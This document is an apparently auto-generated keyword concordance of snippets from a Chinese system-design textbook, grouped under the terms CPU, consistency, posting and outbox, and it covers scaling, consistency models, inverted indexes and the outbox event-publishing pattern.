  c11_b07.md: ...2024 年，AWS 最大实例有 448 个 vCPU 和 24 TB RAM。你无法给单台机器加第 2,000 个 CPU。 * 成本非线性：一台 10 倍 RAM 的机器通常比基础（BASE）实例贵 10 倍以上。 * 单台机器再强也是单点...
  c11_b12.md: ...查找 Redis（或数据库）。这增加每次请求约 1ms 网络延迟，并需要 Redis 基础设施依赖。JWT 验证是本地 CPU 操作（加密签名检查），零网络延迟、零外部依赖。  **根本局限——撤销：** JWT 在过期前一直有效，无论服务器做什...
  c11_b12.md: ...点是什么？生产系统中通常如何组合？  **答案：**  **垂直扩展（scale up）：** 增加单台机器容量。更多 CPU、更大 RAM、更快存储。机器无需增加复杂度即可处理更多负载。  优点：简单（无需改代码）、无协调开销、对任何瓶颈都立即...
  c12_b01.md: ...。  查询延迟从 5 毫秒爬到 50 毫秒，再到 200 毫秒。某个周三下午，PostgreSQL 监控面板显示数据库 CPU 钉在 95%。应用服务器没事——它们还有余量。负载均衡器运转良好。但每个请求最终都会触及数据库，而数据库跟不上了。...
  c12_b03.md: ...代码更新：写操作（INSERT、UPDATE、DELETE）路由到主库；读操作（SELECT）负载均衡到两个副本。主库 CPU 从 95% 降到 35%，查询延迟回到个位数毫秒。  但团队做了一个关键路由决策：对于用户必须读取自己最近写入的操作—...
  c12_b03.md: ...进内存——数据库要花时间去磁盘读索引页。  多少读副本都没用。主库本身跟不上了。  根本问题：一台数据库服务器无论多强，CPU、RAM、磁盘带宽和网络带宽都有限。一旦触及这些极限，垂直扩展（加 RAM、更快磁盘）收益递减，最终撞到物理极限。  解...
  c13_b01.md: ...：如果问题不是分片策略而是共享本身呢？如果多个不相关功能争夺同一个数据库——同样的表、同样的索引、同样的连接池、同样的 CPU——才是脆弱的根本原因呢？  这就是微服务背后的直觉。不是一个大应用配一个大数据库，而是很多小服务，每个有自己的数据存储...
  c13_b02.md: ...中不断合并冲突。“部署列车”（跨团队协调发布）变成每周仪式，拖慢所有人。 * **扩展不灵活：** 通知功能用 10% CPU；图像处理用 70%。你无法独立扩展它们——你扩展整个单体，为你不需要的额外通知容量付费。 * **技术锁定：** 整个...
  c13_b13.md: ...0,000 次请求，每次都需要序列化和反序列化中等复杂度的 JSON 对象（比如 2-5 KB），JSON 解析消耗的 CPU 时间会累积。Protocol Buffers 对同等数据的解析速度是 JSON 的 3-10 倍。在这个规模上，差异是...
  c17_b07.md: ...vs 基于原因的告警  存在两种告警哲学，结果截然不同。  **基于原因的告警** 对可能指示问题的基础设施指标触发：“CPU 使用率超过 80%”、“磁盘 I/O 超过阈值”、“内存使用率超过 70%”。推理：CPU 高可能导致响应慢，所以 C...
  c17_b07.md: ...示问题的基础设施指标触发：“CPU 使用率超过 80%”、“磁盘 I/O 超过阈值”、“内存使用率超过 70%”。推理：CPU 高可能导致响应慢，所以 CPU 高时告警。  问题：这些告警经常在用户没问题时频繁触发。CPU 可能因为大型批处理作业...
  c17_b07.md: ...U 使用率超过 80%”、“磁盘 I/O 超过阈值”、“内存使用率超过 70%”。推理：CPU 高可能导致响应慢，所以 CPU 高时告警。  问题：这些告警经常在用户没问题时频繁触发。CPU 可能因为大型批处理作业而高，但没有用户影响。内存可能因...
  c17_b07.md: ...率超过 70%”。推理：CPU 高可能导致响应慢，所以 CPU 高时告警。  问题：这些告警经常在用户没问题时频繁触发。CPU 可能因为大型批处理作业而高，但没有用户影响。内存可能因为缓存——这是故意的。基于原因的告警满是误报。  **基于症状的...
  c17_b10.md: ...。当你关心当前水平时用 gauge；当你关心大量测量值的分布和尾部行为时用 histogram。  **Q2.** 当 CPU 使用率超过 80% 时触发监控告警。这是什么类型告警，有什么弱点？  **答案：** 这是基于原因的告警——它对可能指...
  c17_b10.md: ...业、JVM 垃圾回收、缓存预热）而没有任何用户影响，产生误报。(2) CPU 低不能保证服务良好——服务可能有 20% CPU 但因返回错误很快的 bug 而完全失败。(3) 它不直接测量用户体验。更好的替代是告警“错误率超过 1%”或“p99...
  c18_b03.md: ...级？” * “错误率何时超过我们的 SLO 阈值？” * “系统在持续负载下会稳定还是渐进降级？” * “瓶颈在哪里——CPU、数据库连接、网络带宽还是其他？”  负载测试在 staging 环境（镜像生产架构但使用较小实例和测试数据）上运行真实...
  c18_b11.md: ...**答案：** 稳态（steady state，状态）是系统正常、健康运行时的基线行为：错误率、延迟百分位、队列深度、CPU 利用率分别是多少。必须在混沌实验前定义它，因为实验目的就是观察引入失败后系统是否回到稳态（状态）。如果你不知道稳态长什...
  c27_b01.md: ...（数据完整性、查询灵活、ACID 保证）显著。  **技术债务：** 数据库和应用在同一服务器意味着它们竞争资源。应用 CPU 繁忙时，数据库查询变慢。  **变革信号：** PostgreSQL 和应用竞争 CPU 导致高峰使用期间偶尔页面加载...
  c27_b01.md: ...务器意味着它们竞争资源。应用 CPU 繁忙时，数据库查询变慢。  **变革信号：** PostgreSQL 和应用竞争 CPU 导致高峰使用期间偶尔页面加载变慢。数据库需要自己的机器。...
  c27_b02.md: ...教训：** 每个队列都需要监控。队列深度、处理速率、错误率都必须可见。  **变革信号：** 单个应用服务器在高峰时段 CPU 使用率达 90%。添加第二台服务器暴露了 sticky session 问题：用户被随机路由到没有其会话的服务器。...
  c27_b03.md: ...WT 用于读多 API 调用，Redis 会话用于需要立即撤销的管理操作  **为什么正确：** 三台应用服务器使高峰 CPU 利用率降至 30%。负载均衡器增加健康检查——一台服务器崩溃时，30 秒内流量绕开它。  **第一次故障：** 向水平...
  c27_b03.md: ...台应用服务器产生的数据库负载超过单个 PostgreSQL 实例能处理的。  **变革信号：** PostgreSQL CPU 达 95%。日志中出现慢查询。值班工程师每周两次被告警数据库性能。   #### v5 —— 第 12 章：数据库扩展...
  c27_b11.md: ...数据重启后消失 v1 → v2 | 添加 Redis 缓存 | 以陈旧和缓存失效复杂度为代价获得更低读延迟 | 数据库 CPU 高；profile 读取慢 v2 → v3 | 添加消息队列 | 以最终投递和监控复杂度为代价获得解耦写（更快 API...
  c27_b11.md: ...→ v4 | 水平扩展 + 无状态会话 | 以会话迁移 + Redis 依赖为代价获得更高吞吐 | 单服务器 90% CPU；发现 sticky session 破坏 v4 → v5 | 数据库分片 + 读副本 | 以跨分片查询复杂度和迁移痛苦...
  c27_b11.md: ...v4 → v5 | 数据库分片 + 读副本 | 以跨分片查询复杂度和迁移痛苦为代价获得读写可扩展性 | 数据库 95% CPU；值班每周告警 v5 → v6 | 微服务分解 | 以分布式追踪和更高运营复杂度为代价获得独立部署 | 单体部署造成跨团...
  c27_b13.md: ...。没有决策是错的；每个在当时都正确，并成为下一次演进的起点。驱动每次演进的信号是可观察、具体、明确的：“数据库 95% CPU”不是抽象担忧，而是要求具体响应的测量事实。  **技术债务** 不是失败——它是理性借债。分类法（故意、无意、bit...
  c28_b03.md: ...是单个指标越过任意阈值。“p99 延迟连续 5 分钟（5 minutes）> 500ms”是可操作且与用户相关的告警。“CPU > 80%”可能吓人，但没告诉 on-call 工程师用户是否真的在经历降级服务。  **On-call 卫生：**...
  c28_b22.md: ...钟（45 minutes）内看到空白 feed。为什么？Feed 查询在 `posts` 表上执行全表扫描，耗尽数据库 CPU。为什么？索引 `posts_user_id_created_at_idx` 缺失——迁移脚本包含了一个非预期的 `DR...

=== consistency (42 occurrences) ===
  c01_b12.md: ...章，我们将把系统的词汇形式化：latency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）和 durability（持久性）。它们不只是定义——而是每个架构 tradeoff（权衡）必须被描绘的坐标轴...
  c02_b03.md: ...时宕机时系统才不可用。  但冗余引入了它自己的挑战：哪个实例拥有正确数据？这就是一致性问题的开端。   ### 2.3 Consistency——哪个版本的真相？  一个场景。一位 SocialSnap 用户更新了头像。更改发到服务器 A。一毫秒后，他的朋友从服...
  c02_b03.md: ...多重要。社交 Feed 里 5 秒的旧数据？可接受。电商网站的库存数据 5 秒的旧数据？你可能会卖出没有库存的商品。  Consistency（一致性）就是描述系统对数据跨组件呈现方式做出什么保证的概念。   #### 定义：Consistency  **Con...
  c02_b03.md: ...存的商品。  Consistency（一致性）就是描述系统对数据跨组件呈现方式做出什么保证的概念。   #### 定义：Consistency  **Consistency（一致性）** 是系统中所有节点在同一时间看到相同数据的保证（或关于它们如何可以不同的明确...
  c02_b03.md: ...ncy（一致性）就是描述系统对数据跨组件呈现方式做出什么保证的概念。   #### 定义：Consistency  **Consistency（一致性）** 是系统中所有节点在同一时间看到相同数据的保证（或关于它们如何可以不同的明确规则集）。  用大白话说：一致...
  c02_b03.md: ...？”  一致性模型有一个光谱，我们将在第 4 章深入探讨。现在，重要的是两端之间的区别：  **强一致性（strong consistency）：** 写完成后，任何节点、任何地点的后续读都返回更新后的值。只有一个真相版本，所有人立即看到。  **最终一致性（e...
  c02_b03.md: ...后，任何节点、任何地点的后续读都返回更新后的值。只有一个真相版本，所有人立即看到。  **最终一致性（eventual consistency）：** 写完成后，不同节点的读可能暂时返回不同值。但如果没有新的写，所有节点_最终_会收敛到相同值。Amazon 购物...
  c02_b03.md: ...eed 和 DNS 记录都是最终一致系统的例子。  在这两个极端之间还有许多中间模型（read-your-writes consistency、causal consistency、monotonic read consistency）——但关键直觉是：更强的一...
  c02_b03.md: ...统的例子。  在这两个极端之间还有许多中间模型（read-your-writes consistency、causal consistency、monotonic read consistency）——但关键直觉是：更强的一致性在延迟和可用性上成本更高。...
  c02_b03.md: ...d-your-writes consistency、causal consistency、monotonic read consistency）——但关键直觉是：更强的一致性在延迟和可用性上成本更高。...
  c02_b05.md: ...#### 常见误解  Durability 和 consistency 是不同的保证，可以独立组合。一个系统可以：  * **持久但不一致：** 你把每次写都持久化到磁盘，但同一时刻两个副本...
  c02_b05.md: ...**两者兼具：** 带同步复制的传统 ACID 关系型数据库。  关系型数据库的 ACID 属性（Atomicity, Consistency, Isolation, Durability）把多个保证打包在一起——我们将在第 5 章仔细审视它们。   ### 2...
  c02_b05.md: ...当网络说谎时  上面的指标——latency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）、durability（持久性）——描述的是系统正常运行时的情况。但网络不可靠。消息会丢失。路由器会故障。网线...
  c02_b07.md: ...）故障转移可以进一步提升。  更广泛的教训：链式依赖会乘性放大不可用性。每层的冗余是标准解法。  **Q3.** 解释 consistency（一致性）和 durability（持久性）的区别。分别举一个持久但不强一致、以及强一致但持久性保证有限的系统例子。...
  c02_b07.md: ...到磁盘（durable）并复制到多个节点。但如果你配置成优先可用性（replication factor 3，read consistency ANY，write consistency ONE），不同节点可能暂时对同一个键显示不同值。数据不会丢失（durabl...
  c02_b07.md: ...如果你配置成优先可用性（replication factor 3，read consistency ANY，write consistency ONE），不同节点可能暂时对同一个键显示不同值。数据不会丢失（durable），但不同读者可能短暂看到不同版本（not...
  c02_b09.md: ...*Q2.** 你正在设计一个银行转账系统。请把六个指标（latency、throughput、availability、consistency、durability、partition tolerance）按对该用例的重要性排序，并说明前三名的理由。  提示...
  c02_b09.md: ...的，哪种只是烦人？  **答案：** 建议排序（对转账系统从最关键到最不重要）：**Durability（持久性） > Consistency（一致性） > Availability（可用性） > Partition Tolerance（分区容错性） > Thr...
  c02_b12.md: ...言。本章引入的六个指标——**latency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）、durability（持久性）和 partition tolerance（分区容错性）**——是衡量每个架构...
  c23_b01.md: ...付索引成本：读取文档、提取每个有意义的词，并记录哪些文档包含该词。然后用户搜索“distributed systems consistency（分布式系统 一致性）”时，搜索引擎不会扫描数十亿文档。它查三个词在预计算表中的倒排列表并求交集。又是写时付费、读时受益...
  c23_b04.md: ...s design requires tradeoffs" 3 | "distributed computing and consistency（一致性）" 4 | "design patterns for reliability"  用户搜索 "distribu...
  c23_b04.md: ...ibuted | [1, 3] systems | [1, 2] design | [2, 4] hard | [1] consistency | [3] tradeoffs | [2] reliability | [4]  "distributed syste...
  c23_b06.md: ...的直觉是：  * **Term Frequency (TF)：** 一个词在文档中出现很多次，可能对文档很重要。如果 "consistency" 在文档中出现 30 次，该文档很可能讲一致性。 * **Inverse Document Frequency (ID...
  c23_b06.md: ...IDF = log(10,000,000,000) ≈ 23——找到它是强信号。  多词查询 "distributed consistency" 对某文档的总分是每个查询词的 TF-IDF 得分之和。   #### 常见误解  关于 TF-IDF 的常见误解是更...
  c23_b08.md: ...如下：  1. **查询处理：** 应用索引时相同的分词、归一化和停用词移除。"Distributed Systems Consistency" 变成 ["distribut", "system", "consist"]（词干提取后）。 2. **词项查找：**...
  c28_b10.md: ...#### 第一部分：基础  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|-...
  c28_b10.md: ...迟更低 | 最终（异步副本）；强（同步） | 更高——主库故障读仍存活 | 中——需监控复制 lag **Strong consistency** (Ch 4 ACID) | 更高——需要写协调 | 强——所有读者看到最新写 | 较低——分区导致不可用 | 中...
  c28_b10.md: ...ID) | 更高——需要写协调 | 强——所有读者看到最新写 | 较低——分区导致不可用 | 中 **Eventual consistency** (Ch 4 BASE) | 更低——读写无需协调 | 最终——读可能返回陈旧数据 | 更高——分区不阻塞操作 |...
  c28_b10.md: ...——读写无需协调 | 最终——读可能返回陈旧数据 | 更高——分区不阻塞操作 | 中——需要冲突解决 **Causal consistency** (Ch 4) | 中——因果元数据开销 | 因果——保证“看到自己的写” | 高 | 高——需要 vector c...
  c28_b10.md: ...（术语译法：一致性（consistency）、可用性（availability）、最终一致性（eventual consistency）、强一致性（strong consistency）） * * *...
  c28_b10.md: ...）、可用性（availability）、最终一致性（eventual consistency）、强一致性（strong consistency）） * * *...
  c28_b10.md: ...#### 第一部分：基础  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|-...
  c28_b10.md: ...迟更低 | 最终（异步副本）；强（同步） | 更高——主库故障读仍存活 | 中——需监控复制 lag **Strong consistency** (Ch 4 ACID) | 更高——需要写协调 | 强——所有读者看到最新写 | 较低——分区导致不可用 | 中...
  c28_b10.md: ...ID) | 更高——需要写协调 | 强——所有读者看到最新写 | 较低——分区导致不可用 | 中 **Eventual consistency** (Ch 4 BASE) | 更低——读写无需协调 | 最终——读可能返回陈旧数据 | 更高——分区不阻塞操作 |...
  c28_b10.md: ...——读写无需协调 | 最终——读可能返回陈旧数据 | 更高——分区不阻塞操作 | 中——需要冲突解决 **Causal consistency** (Ch 4) | 中——因果元数据开销 | 因果——保证“看到自己的写” | 高 | 高——需要 vector c...
  c28_b10.md: ...（术语译法：一致性（consistency）、可用性（availability）、最终一致性（eventual consistency）、强一致性（strong consistency）） * * *...
  c28_b10.md: ...）、可用性（availability）、最终一致性（eventual consistency）、强一致性（strong consistency）） * * *...
  c28_b11.md: ...#### 第二部分：构建块  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|-...
  c28_b12.md: ...#### 第三部分：扩展模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|-...
  c28_b13.md: ...#### 第四部分：可靠性与运维  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|-...
  c28_b14.md: ...#### 第五部分：案例研究模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|-...
  c28_b15.md: ...#### 第六部分：组织与元层面  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|-...

=== posting (41 occurrences) ===
  c23_b04.md: ...天。  倒排索引反转文档与词之间的关系。不是“文档 → 它包含的词”，而是“词 → 包含它的文档”：  Word | Posting List（Doc IDs） ---|--- distributed | [1, 3] systems | [1, 2]...
  c23_b04.md: ...bility | [4]  "distributed systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1...
  c23_b04.md: ...的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 po...
  c23_b04.md: ...ng list = [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1)...
  c23_b04.md: ...= [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1) 查找（索引是 hash map 或 B-tr...
  c23_b04.md: ...ex）** 是一种数据结构，将文档语料库中每个唯一词（term）映射到包含该词的文档列表。列表中的每个条目——称为 **posting** ——通常不仅存文档 ID，还存词在文档中的词频和出现位置。  plain 语言：倒排索引是一张查找表，对任意词，立...
  c23_b04.md: ...任意词，立即告诉你哪些文档包含它。索引成本在添加文档时支付一次；查询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  *...
  c23_b04.md: ...档时支付一次；查询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：**...
  c23_b04.md: ...简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：** 该词在文档中出现多少次？提到 "distributed...
  c23_b04.md: ...的词）。 * **Field indicator：** 词在标题、标题栏还是正文中？标题中的词权重更高。  这些增强让 posting list 显著变大，但也支持更精细的排序。...
  c23_b04.md: ...天。  倒排索引反转文档与词之间的关系。不是“文档 → 它包含的词”，而是“词 → 包含它的文档”：  Word | Posting List（Doc IDs） ---|--- distributed | [1, 3] systems | [1, 2]...
  c23_b04.md: ...bility | [4]  "distributed systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1...
  c23_b04.md: ...的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 po...
  c23_b04.md: ...ng list = [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1)...
  c23_b04.md: ...= [1]。  两个有序列表的交集操作是 O(n + m)，n 和 m 是 posting list 长度。对大多数词，posting list 远小于总文档数。速度来自这里：倒排索引允许我们每个词 O(1) 查找（索引是 hash map 或 B-tr...
  c23_b04.md: ...ex）** 是一种数据结构，将文档语料库中每个唯一词（term）映射到包含该词的文档列表。列表中的每个条目——称为 **posting** ——通常不仅存文档 ID，还存词在文档中的词频和出现位置。  plain 语言：倒排索引是一张查找表，对任意词，立...
  c23_b04.md: ...任意词，立即告诉你哪些文档包含它。索引成本在添加文档时支付一次；查询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  *...
  c23_b04.md: ...档时支付一次；查询收益此后永远获得。   #### 超越简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：**...
  c23_b04.md: ...简单词匹配——Posting List 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：** 该词在文档中出现多少次？提到 "distributed...
  c23_b04.md: ...的词）。 * **Field indicator：** 词在标题、标题栏还是正文中？标题中的词权重更高。  这些增强让 posting list 显著变大，但也支持更精细的排序。...
  c23_b05.md: ...移除几乎每份文档都出现的极常见词，这些词对相关性贡献很小："the"、"is"、"and"、"a"。这些词会创建巨大 posting list 却只有微不足道的排序收益。 5. **词干提取或词形还原：** 把词还原为词根。"Running"、"ran...
  c23_b05.md: ...的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到 token 的 posting list。  该流水线对每个爬取页面运行。100 亿（10 billion）页面，且为保持索引新鲜每天可能重新爬取 1...
  c23_b05.md: ...# 索引分片  没有单机能容纳 100 亿（10 billion）页面的完整倒排索引。常用词如 "systems" 的 posting list 可能包含数亿文档 ID——仅这一个词就几十 GB。整个网页倒排索引是数百 TB。  如第 12 章所学，解决...
  c23_b08.md: ...em", "consist"]（词干提取后）。 2. **词项查找：** 对每个词，从倒排索引（可能跨多个分片）检索其 posting list。 3. **打分：** 对每个候选文档（出现在 posting list 交集中的文档），计算结合 TF-I...
  c23_b09.md: ...词”关系。它使搜索快，因为查询通过：(1) 在索引中查找每个查询词——每词 O(1) hash 查找；(2) 交集结果 posting list。两个有序列表交集是 O(n + m)，n 和 m 是 posting list 大小。这比扫描所有文档快得多...
  c23_b09.md: ...1) hash 查找；(2) 交集结果 posting list。两个有序列表交集是 O(n + m)，n 和 m 是 posting list 大小。这比扫描所有文档快得多，因为即使对常见词，posting list 也只是所有文档的极小一部分。  *...
  c23_b09.md: ...列表交集是 O(n + m)，n 和 m 是 posting list 大小。这比扫描所有文档快得多，因为即使对常见词，posting list 也只是所有文档的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filte...
  c23_b10.md: ...100 亿（10-billion）页面网页倒排索引的总存储量。假设平均每页在停用词移除后含 2,000 个不同词，每个 posting 存文档 ID（8 字节）、词频（4 字节）和第一个位置（4 字节）。  提示  索引中 (term, document...
  c23_b10.md: ...document) 对总数是关键量。思考平均每页对索引的贡献，然后放大。  **答案：** 每页约贡献 2,000 个 posting（每个不同词一个）。100 亿（10 billion）页：总 posting = 10 billion × 2,000...
  c23_b10.md: ...**答案：** 每页约贡献 2,000 个 posting（每个不同词一个）。100 亿（10 billion）页：总 posting = 10 billion × 2,000 = 20 万亿（trillion）posting。每个 posting 8...
  c23_b10.md: ...0 billion）页：总 posting = 10 billion × 2,000 = 20 万亿（trillion）posting。每个 posting 8 + 4 + 4 = 16 字节。原始索引总大小 = 20 trillion × 16 字节...
  c23_b10.md: ...：总 posting = 10 billion × 2,000 = 20 万亿（trillion）posting。每个 posting 8 + 4 + 4 = 16 字节。原始索引总大小 = 20 trillion × 16 字节 = 320 TB（te...
  c23_b10.md: ...TB（terabyte）。实践中，压缩（排序文档 ID 的 delta 编码可高度压缩）降低 5–10 倍，得到压缩 posting list 约 32–64 TB。词表（所有不同词集合及其在 posting list 中的偏移）是 comparati...
  c23_b10.md: ...码可高度压缩）降低 5–10 倍，得到压缩 posting list 约 32–64 TB。词表（所有不同词集合及其在 posting list 中的偏移）是 comparatively 小的额外结构。  **Q2.** 一个使用 document-ba...
  c23_b10.md: ...这是到分片层的网络往返。(3) **每分片处理**（约 30–50ms，并行）：每个分片从本地倒排索引查找 3 个词的 posting list，交集得到候选文档 ID，用 TF-IDF 和预计算 PageRank（每个文档存储）对候选打分，返回 top...
  c23_b11.md: ...大批量处理，然后把更新后的索引段推送到副本），而非实时更新。若要求 1 秒新鲜度，架构将根本改变：不再是批量索引段，新 posting 必须立即合并到实时索引，需要每个分片的写路径变更，并用强同步避免更新窗口期间提供不一致结果。倒排索引必须支持类似 MV...
  c23_b13.md: ...和第 22 章预计算 timeline 中首次出现的“用写入成本换读取速度”的权衡。索引昂贵；搜索快是因为工作提前完成。Posting list 用 TF、位置和字段指示器增强，支持排序和短语匹配。  **TF-IDF** 通过术语特异性镜头对文档相关性...
  c26_b06.md: ...）。不需要强一致性；< 5 秒陈旧的最终一致性（eventual consistency）可接受。  **搜索倒排索引 posting 缓存**：搜索服务层热层（第 23 章）缓存热门词 posting list。N=3，W=2，R=2。偏好强一致（W...
  c26_b06.md: ...onsistency）可接受。  **搜索倒排索引 posting 缓存**：搜索服务层热层（第 23 章）缓存热门词 posting list。N=3，W=2，R=2。偏好强一致（W + R = 4 > N = 3），因为陈旧的 posting lis...
  c26_b06.md: ...热门词 posting list。N=3，W=2，R=2。偏好强一致（W + R = 4 > N = 3），因为陈旧的 posting list 会导致错误搜索结果。权衡：以稍高写/读延迟换取一致性。  **个人资料与帖子数据**：**不在**键值存储中...
  c26_b08.md: ...中 2 确认——较慢，且若 2 个节点宕机会失败。读必须 3 中 2 回复——更多网络请求。但保证看到最新写。用于搜索 posting 缓存和会话存储，因为陈旧有用户可见后果。  **Q3.** 什么是 hinted handoff，在什么条件下它保持数...

=== outbox (39 occurrences) ===
  c15_b07.md: ...系统两者都用：简单事件驱动编舞用于常规服务间交互，编排器用于少数关键、复杂、必须可见的业务流程。   ### 15.6 Outbox 模式——可靠事件发布  上面描述的 saga 模式依赖服务可靠发布事件。但考虑 Payment Service：...
  c15_b07.md: ...ual-write problem）**：不通过分布式事务，就不可能原子地写入两个独立系统（数据库和消息队列）。  **Outbox 模式**通过只写入一个系统——数据库——然后由独立进程发布事件来解决。...
  c15_b08.md: ...#### 定义：Outbox 模式  **Outbox 模式**是一种可靠发布事件的技术。服务不直接把事件发布到消息队列，而是把事件与业务数据更新写...
  c15_b08.md: ...#### 定义：Outbox 模式  **Outbox 模式**是一种可靠发布事件的技术。服务不直接把事件发布到消息队列，而是把事件与业务数据更新写在同一数据库事务中，写入自...
  c15_b08.md: ...**是一种可靠发布事件的技术。服务不直接把事件发布到消息队列，而是把事件与业务数据更新写在同一数据库事务中，写入自己的“outbox”表。一个独立进程（**消息中继，message relay**）从 outbox 表读取并向消息队列发布事件。  pl...
  c15_b08.md: ...更新写在同一数据库事务中，写入自己的“outbox”表。一个独立进程（**消息中继，message relay**）从 outbox 表读取并向消息队列发布事件。  plain 语言：不是两个独立写入（数据库 + 消息队列），而是在一个事务里做两个数据...
  c15_b08.md: ...件记录）。事务保证这两次写入原子。然后消息中继处理第二步（数据库 → 消息队列），用重试逻辑确保事件最终被发布。  带 Outbox 模式的支付操作：       BEGIN;         INSERT INTO payments (user_id...
  c15_b08.md: ...d, amount, ...) VALUES (42, 9.99, ...);         INSERT INTO outbox (event_type, payload, status)             VALUES ('payment....
  c15_b08.md: ...2, "amount": 9.99}', 'pending');     COMMIT;   事务保证：要么支付记录和 outbox 记录都保存，要么都不保存。消息中继（后台进程）查询 outbox 中 pending 事件并发布到消息队列，然后标记为...
  c15_b08.md: ...COMMIT;   事务保证：要么支付记录和 outbox 记录都保存，要么都不保存。消息中继（后台进程）查询 outbox 中 pending 事件并发布到消息队列，然后标记为已发送。如果中继在标记已发送前崩溃，它重试——并且由于消息队列支持...
  c15_b08.md: ...已发送。如果中继在标记已发送前崩溃，它重试——并且由于消息队列支持幂等消费（消息按消息 ID 去重），重试是安全的。  Outbox 模式把双写问题转换为单数据库写入（通过数据库事务原子）加一个可靠中继进程。中继可能多次发布事件（至少一次投递），但消费...
  c15_b08.md: ...#### 定义：Outbox 模式  **Outbox 模式**是一种可靠发布事件的技术。服务不直接把事件发布到消息队列，而是把事件与业务数据更新写...
  c15_b08.md: ...#### 定义：Outbox 模式  **Outbox 模式**是一种可靠发布事件的技术。服务不直接把事件发布到消息队列，而是把事件与业务数据更新写在同一数据库事务中，写入自...
  c15_b08.md: ...**是一种可靠发布事件的技术。服务不直接把事件发布到消息队列，而是把事件与业务数据更新写在同一数据库事务中，写入自己的“outbox”表。一个独立进程（**消息中继，message relay**）从 outbox 表读取并向消息队列发布事件。  pl...
  c15_b08.md: ...更新写在同一数据库事务中，写入自己的“outbox”表。一个独立进程（**消息中继，message relay**）从 outbox 表读取并向消息队列发布事件。  plain 语言：不是两个独立写入（数据库 + 消息队列），而是在一个事务里做两个数据...
  c15_b08.md: ...件记录）。事务保证这两次写入原子。然后消息中继处理第二步（数据库 → 消息队列），用重试逻辑确保事件最终被发布。  带 Outbox 模式的支付操作：       BEGIN;         INSERT INTO payments (user_id...
  c15_b08.md: ...d, amount, ...) VALUES (42, 9.99, ...);         INSERT INTO outbox (event_type, payload, status)             VALUES ('payment....
  c15_b08.md: ...2, "amount": 9.99}', 'pending');     COMMIT;   事务保证：要么支付记录和 outbox 记录都保存，要么都不保存。消息中继（后台进程）查询 outbox 中 pending 事件并发布到消息队列，然后标记为...
  c15_b08.md: ...COMMIT;   事务保证：要么支付记录和 outbox 记录都保存，要么都不保存。消息中继（后台进程）查询 outbox 中 pending 事件并发布到消息队列，然后标记为已发送。如果中继在标记已发送前崩溃，它重试——并且由于消息队列支持...
  c15_b08.md: ...已发送。如果中继在标记已发送前崩溃，它重试——并且由于消息队列支持幂等消费（消息按消息 ID 去重），重试是安全的。  Outbox 模式把双写问题转换为单数据库写入（通过数据库事务原子）加一个可靠中继进程。中继可能多次发布事件（至少一次投递），但消费...
  c15_b09.md: ...### 15.7 SocialSnap 高级版升级——完整实现  把所有内容合起来，SocialSnap 使用编排和 Outbox 模式的高级版升级 saga：  **第 1 步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PE...
  c15_b09.md: ...一条状态为 `PENDING` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.start` 事件并带上 saga ID。HTTP 处理器返回“您...
  c15_b09.md: ...带上 saga ID。HTTP 处理器返回“您的升级正在处理中——请稍后查看。”  **第 2 步：** 消息中继发布 outbox 事件。升级编排器收到事件并开始协调。  **第 3 步：** 编排器调用 Payment Service：“给用户 4...
  c15_b09.md: ..._charge` 是否处理过。没有。它扣款，把结果记录在 `processed_operations` 表，并向自己的 outbox 写入 `payment.charge.succeeded` 事件。它自己的消息中继发布该事件。  **第 5 步：**...
  c15_b09.md: ...aga_7f3a9b2c_upgrade`。”  **第 6 步：** User Service 更新用户，并向自己的 outbox 写入 `user.upgraded.to.premium` 事件。  **第 7 步：** 编排器收到 `user.u...
  c15_b09.md: ...2PC 的分布式多服务工作流 | 没有真正原子性（可见中间状态）；补偿逻辑复杂 | 必须在无共享事务下协调的多服务操作 Outbox 模式 | 无双写即可靠发布事件 | 额外的 outbox 表；消息中继进程；发布略有延迟 | 任何需要在数据库写之后可...
